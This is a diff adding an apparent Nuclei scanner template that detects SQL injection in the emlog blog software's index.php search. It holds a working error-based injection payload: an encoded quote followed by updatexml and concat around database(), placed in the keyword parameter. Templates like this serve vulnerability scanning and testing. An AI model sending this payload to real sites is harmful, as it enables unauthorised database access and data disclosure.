@@ -1,0 +1,26 @@
+id: emlog-index-sqlInjection
+
+info:
+  name: emlog-index-sqlInjection
+  author: iSee857
+  severity: high
+  description: emlog-index-sqlInjection
+
+requests:
+  - method: GET
+    raw:
+      - |
+        GET /index.php?keyword=%2527%20AND%20updatexml(1,concat(0x7e,database(),0x7e),1)%20%20--%2520 HTTP/1.1
+        Host: {{Host}}
+        Accept: */*
+        Connection: close
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "SELECT COUNT(*)"
+
+      - type: status
+        status:
+          - 200
